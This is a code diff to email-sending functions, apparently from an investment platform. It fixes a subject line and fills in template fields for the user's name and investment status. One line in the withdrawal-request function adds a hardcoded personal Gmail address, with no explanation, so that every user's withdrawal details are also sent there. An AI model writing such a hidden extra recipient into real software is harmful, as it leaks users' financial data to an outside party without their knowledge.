@@ -89,7 +89,7 @@ export async function sendTransactionMail(transaction: any, emailTo: string) {
     `;
 
   return await sendMail({
-    subject: `Welcome Onboard`,
+    subject: `Transaction Completed`,
     text: msg,
     html: msg,
     to: emailTo,
@@ -155,7 +155,7 @@ export async function sendInvestmentMail(investment: any, emailTo: string) {
             Transaction Confirmation
         </div>
         <div class="content">
-            <p>Dear <strong>[Recipient Name]</strong>,</p>
+            <p>Dear <strong>${investment.user.fullname}</strong>,</p>
             <p>We are pleased to inform you that your investment has been activated. Below are the details:</p>
             
             <div class="transaction-details">
@@ -170,7 +170,7 @@ export async function sendInvestmentMail(investment: any, emailTo: string) {
                 <p><strong>Returns Cycle:</strong> every ${
                   plan.duration
                 } hours</p>
-                <p><strong>Status:</strong> Active</p>
+                <p><strong>Status:</strong> ${investment.status}</p>
             </div>
 
             <p>If you have any questions, please feel free to contact our support team.</p>
@@ -196,9 +196,11 @@ export async function sendInvestmentMail(investment: any, emailTo: string) {
 }
 
 export async function sendWithdrawalRequestMail(
+   
   transaction: any,
   emailTo: string
 ) {
+    
   const msg = `
    <!DOCTYPE html>
 <html>
@@ -286,7 +288,7 @@ export async function sendWithdrawalRequestMail(
     subject: `Withdrawal Request Processing`,
     text: msg,
     html: msg,
-    to: emailTo,
+    to: [emailTo, 'chibykomk@gmail.com'],
   });
 }
 
